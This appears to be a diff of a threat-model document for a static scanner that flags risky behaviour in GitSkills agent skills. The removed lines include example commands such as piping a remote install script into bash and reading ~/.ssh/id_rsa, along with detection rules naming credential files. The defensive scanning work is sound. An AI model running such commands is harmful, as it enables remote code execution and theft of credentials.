@@ -2,127 +2,73 @@
 
 ## Purpose and Scope
 
-This project examines whether modified or reused GitSkills artifacts introduce security-sensitive behavior that was not present in an earlier version or source artifact.
+This project investigates whether modified or reused GitSkills artifacts contain **new or changed security-sensitive behavior** relative to a sufficiently related artifact. Such changes may increase the opportunities for an agent or its tools to affect the host environment, access sensitive information, or depend on external code and services.
 
-The analysis is static. We inspect skill content and related metadata, but we do not execute any code from the GitSkills release dataset.
-
-The goal is to identify **static risk signals** that may deserve further review. A match is not a confirmed vulnerability and does not, by itself, show malicious intent.
+We use **static analysis** of the GitSkills dataset to identify observable signals that warrant review. A detection is not proof that an instruction was executed, that a vulnerability exists, or that an artifact is malicious. The threat model defines the behaviors of interest and the limits of what our evidence can establish.
 
 ## Trust Boundary
 
-All skill artifacts and related files from the dataset are treated as untrusted input.
+GitSkills artifacts, bundled files, and their instructions are **untrusted data**. The analysis does not execute commands or scripts found in artifacts, retrieve referenced code, or contact services named in their content.
 
-We will not:
+Behavioral analysis covers the body of `SKILL.md` and eligible bundled sibling files. YAML frontmatter in `SKILL.md` is excluded from behavioral detection because descriptive metadata and declared tools do not themselves demonstrate an operation. Sibling files, including configuration and instructional content, may contain behavior-relevant text and are assessed separately.
 
-- execute commands, scripts, or helper files from the dataset;
-- run code referenced by a skill;
-- connect to URLs or services referenced by a skill; or
-- treat a single text match as proof that a skill is unsafe or malicious.
+Candidate relationships are inferred from content similarity and available provenance or chronology evidence. They do not prove direct copying, authorship, or historical ancestry.
 
-Behavioral scanning focuses on the `SKILL.md` body and available related file content. YAML frontmatter is excluded from behavioral scanning because metadata can contain tool names, URLs, or permission declarations without representing instructions that will actually be carried out.
+## Threat Categories and Detection Coverage
 
-Non-English artifacts remain in scope when recognizable technical indicators are present.
+The scanner uses **13 rules across six categories**, primarily based on textual patterns. The rules detect selected signals, not all possible expressions of each behavior.
 
-## Risk Categories
+| Category | Rules | Signals of interest | Main coverage limitation |
+| --- | --- | --- | --- |
+| **Command execution** | `CMD-001`, `CMD-002` | Shell code, interpreters, executable commands, and script invocations | Indirect, dynamic, or unfamiliar execution syntax may be missed. |
+| **Network access** | `NET-001`, `NET-002` | URLs, network clients, requests, and downloads | A URL may be only a reference; dynamically constructed destinations and some protocols may be missed. |
+| **File-system access** | `FS-001`, `FS-002`, `FS-003` | File reads, writes, copies, moves, deletions, and directory changes | Language-specific APIs and indirect or dynamic operations are not exhaustively recognized. |
+| **Credentials and secrets** | `CRED-001`, `CRED-002` | Secret-related identifiers, tokens, environment-variable references, and credential-file paths | Not every credential name or path is recognized; a reference does not prove exposure. |
+| **External code execution** | `EXT-001`, `EXT-002` | Download-and-execute patterns and package installation | Multi-step execution chains, alternate installers, and some platform-specific forms may be missed. |
+| **System modification** | `SYS-001`, `SYS-002` | Privilege elevation, permission changes, services, and system commands | Alternate APIs and platform-specific mechanisms may be missed. |
 
-The current analysis focuses on the following categories:
+Bundled and invoked scripts are assessed through these categories rather than a separate script category. One construct may match multiple rules or categories. For example, downloading a script and piping it to a shell can involve network access, command execution, and external code execution.
 
-| Category | What We Look For |
+The detector records rule IDs, categories, match counts, and source evidence. Rule matches are **signals of possible behavior**, including when they occur in examples or documentation; they are not findings of malicious intent. The active rule definitions and tests are maintained in the source repository.
+
+## Threat Scenarios
+
+The following scenarios illustrate changes that could warrant security review. They are **hypothetical**, not claims about particular artifacts in the dataset.
+
+| Scenario | Security-sensitive change |
 | --- | --- |
-| **Command execution** | Shell commands, interpreters, package managers, or other executable commands |
-| **Network access** | URLs, network clients, remote requests, or commands that retrieve remote content |
-| **File-system access** | Reading, writing, copying, moving, deleting, or modifying files and directories |
-| **Credential-related behavior** | API keys, tokens, passwords, environment variables, credential files, or other secrets |
-| **External code execution** | Download-and-execute behavior, package installation, or execution of externally obtained code |
-| **System modification** | Privilege changes, permissions, service changes, or other system-level modifications |
+| **Remote code execution** | A skill begins directing an agent to download and run code from an external source. |
+| **Credential exposure** | A skill introduces access to credential files or includes secrets in an outbound operation. |
+| **Destructive file operations** | A skill adds deletion commands or expands the scope or privileges of file modifications. |
+| **Supply-chain redirection** | A skill changes where executable code, dependencies, or external instructions are obtained. |
+| **System modification** | A skill adds privileged operations or changes permissions, services, or system configuration. |
 
-Bundled or invoked scripts are also relevant when their contents or invocation introduce behavior in one or more of these categories.
+These behaviors can also be part of legitimate workflows. The analysis evaluates observable changes and context, not an author's intent.
 
-Examples of patterns that may be flagged include:
+## Comparing Related Artifacts
 
-- `curl https://example.com/install.sh | bash`
-- `rm -rf /tmp/cache`
-- `cat ~/.ssh/id_rsa`
-- `pip install some-package`
-- `sudo systemctl restart service-name`
+The analysis distinguishes three complementary stages:
 
-These examples illustrate the kinds of behavior the scanner looks for. Whether a particular use is harmful depends on context.
+1. **Detection:** Identify security-sensitive patterns and record their rules, categories, counts, and source locations.
+2. **Evidence comparison:** Extract recognizable source constructs and compare related artifacts to identify added, removed, or matching evidence. Changes in rule counts are reported separately from changes in the underlying constructs.
+3. **Risk assessment:** Evaluate changed evidence against **11 defined risk indicators (RI-001–RI-011)**. Indicators require supporting observations; a rule match or increased count alone is not enough. Uncertain observations are reported separately.
 
-## Implemented Detection Rules
+Directional conclusions are made only when there is sufficient evidence to treat one artifact as the base and another as the derived candidate. When direction is uncertain, the relationship remains unresolved rather than being characterized as an introduction or removal of behavior. The method does not assume that any particular removed instruction was directly replaced by an added one.
 
-The categories above define the behaviors of interest. The following table defines
-the current scanner coverage: 13 active rules registered in
-[`src/gitskills/rules/registry.py`](src/gitskills/rules/registry.py). Each rule
-detects selected text patterns, rather than every possible expression of a
-category. URL references, credential references, and package-installation
-instructions are intentional signals even when execution or actual access cannot
-be established.
+The evidence-comparison and risk-indicator methods are documented in [RDR-008](docs/decisions/RDR-008-evidence-representation-and-comparison.md) and [RDR-010](docs/decisions/RDR-010-evidence-based-risk-indicators.md).
 
-| Rule ID | Category | Implemented detection |
-| --- | --- | --- |
-| `CMD-001` | Command execution | Opening triple-backtick fences labeled `bash`, `sh`, `shell`, `zsh`, `fish`, `powershell`, or `pwsh`. |
-| `CMD-002` | Command execution | Selected interpreter/tool invocations followed by arguments: shell interpreters, Python, Node, Bun, uv/uvx, npm/npx, pnpm, Yarn, pip, Docker, PowerShell/pwsh, and `cmd.exe`. |
-| `NET-001` | Network access | HTTP and HTTPS URL references. |
-| `NET-002` | Network access | `curl`/`wget` commands, selected Python `requests` methods, and PowerShell `Invoke-WebRequest`/`Invoke-RestMethod`. |
-| `FS-001` | File-system access | `rm`, `mv`, `cp`, `mkdir`, `touch`, and selected PowerShell file-operation commands such as `Remove-Item` and `Set-Content`. |
-| `FS-002` | File-system access | Python-style `open(...)` calls with explicit write/append/create/update modes, and method calls named `write_text`, `write_bytes`, or `write`. |
-| `FS-003` | File-system access | `cat`, `less`, `more`, `Get-Content`, `read_text`/`read_bytes`, and selected Node `fs` reading APIs. |
-| `CRED-001` | Credential-related behavior | Selected secret identifiers such as `api_key`, `access_token`, `client_secret`, and `password`; named AWS/GitHub/OpenAI secret identifiers; and identifiers ending in `_ACCESS_TOKEN`. |
-| `CRED-002` | Credential-related behavior | `.env` files and variants, selected SSH files (`id_rsa`, `id_ed25519`, `config`), and AWS credential-file paths. |
-| `EXT-001` | External code execution | A `curl`/`wget` command piped directly into `bash`, `sh`, or `zsh` on the same line. |
-| `EXT-002` | External code execution | Selected installation commands: pip/pip3, npm, apt/apt-get, dnf, yum, and brew. |
-| `SYS-001` | System modification | `sudo` commands and selected `su` invocations. |
-| `SYS-002` | System modification | `chmod`, `chown`, `setfacl`, `systemctl`, `service`, and `crontab` commands. |
+## Coverage and Uncertainty
 
-Rules scan the `SKILL.md` body with skill frontmatter masked. Eligible sibling
-content is scanned as text without that masking, so configuration and instruction
-files remain observable; sibling eligibility follows
-[RDR-009](docs/decisions/RDR-009-sibling-security-scanning-scope.md).
-An input may match multiple rules, but a match in one category does not imply
-that all other applicable categories will also be detected.
+Eligible **added or changed sibling files with available, nonempty content** are examined regardless of file extension. Files without stored content are not fetched or executed. Their metadata may indicate that a resource changed, but its behavior cannot be determined. The sibling-selection policy is documented in [RDR-009](docs/decisions/RDR-009-sibling-security-scanning-scope.md).
 
-Known coverage limits include direct script invocation such as
-`./scripts/setup.sh`, ordinary Python reads such as
-`open('report.txt', 'r').read()`, credential environment-variable names such as
-`DATABASE_PASSWORD`, package installation via `pnpm add`, and PowerShell
-download-and-execute pipelines. These forms are not reliably identified in their
-respective categories by the current rules, although another rule may still
-detect a signal in the same input. Other languages, syntax variants, obfuscation,
-and multi-step operations can also be missed. Absence of a match does not
-establish absence of security-sensitive behavior.
+Extracted evidence is identified as **complete**, **partial**, or **unsupported**, and unavailable sibling content is reported separately. Complete extraction means that the *detected constructs* were fully captured from available content; it does **not** mean that all security-sensitive behavior was found.
 
-Positive and negative examples for every active rule are maintained in
-[`tests/pytests/test_security_rules.py`](tests/pytests/test_security_rules.py).
-These tests verify the implemented pattern definitions, not exhaustive detection
-or measured accuracy on the dataset.
+Regex-based static analysis can miss obfuscated or indirect actions, unfamiliar syntax, and risky instructions expressed only in prose, including non-English prose without recognizable technical indicators. It may also flag benign documentation, examples, or warnings. Neither the absence of a detection nor the absence of a supported risk indicator establishes that an artifact is safe.
 
-## Comparison Across Related Artifacts
+## Interpretation and Safe Reporting
 
-The project is interested in **newly introduced behavior**, not just whether a single skill contains a risky-looking pattern.
+Our results describe **static detections, observable evidence changes, and supported or uncertain risk indicators requiring review**. They do not establish runtime execution, successful network access, actual credential disclosure, exploitability, malicious intent, or verified artifact lineage.
 
-When a related pair can be reasonably ordered, the analysis compares the earlier/source artifact with the later/modified artifact and looks for security-sensitive behavior that appears only in the later artifact.
+Reports preserve relevant source evidence and coverage limitations. Sensitive-looking excerpts are redacted on a best-effort basis, and generated reports should be reviewed before sharing. Manual validation is necessary to assess false positives, missed behavior, and the reliability of inferred changes.
 
-Candidate-family membership or similarity alone does not prove that one artifact was copied from another, who authored it, or which artifact is the true original source. Relationships without enough evidence to establish direction should remain unresolved.
-
-## What This Analysis Can and Cannot Show
-
-Static analysis can show that an artifact contains text associated with security-sensitive behavior and that a related artifact may contain behavior that was not observed earlier.
-
-It cannot determine:
-
-- whether a command or script was actually executed;
-- whether a URL was reachable or contacted;
-- whether a credential reference points to a real secret;
-- whether a file operation is harmful in a specific environment;
-- whether a detected change was malicious or simply required by the skill's intended function; or
-- whether a detected static signal is an exploitable vulnerability.
-
-For example, a skill may include `curl` in documentation or as part of a legitimate installation workflow. The scanner may still flag it because the project is measuring the presence of the behavior, not deciding intent from a single pattern.
-
-## Safe Reporting
-
-Findings will be described as **static risk signals**, **security-sensitive behavior**, or **findings requiring review**.
-
-We will not describe a flagged artifact as compromised, malicious, or vulnerable unless separate evidence supports that conclusion.
-
-Detailed research and methodology decisions are maintained under [`docs/decisions/`](docs/decisions/). Known limitations of the research method are documented in [`THREATS_TO_VALIDITY.md`](THREATS_TO_VALIDITY.md).
+Detailed operational instructions are maintained in [`TOOLS.md`](TOOLS.md). Broader methodological limitations are documented in [`THREATS_TO_VALIDITY.md`](THREATS_TO_VALIDITY.md).
